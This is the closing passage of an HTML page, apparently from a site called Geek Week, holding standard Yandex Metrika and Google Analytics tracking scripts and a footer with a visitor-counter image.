                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>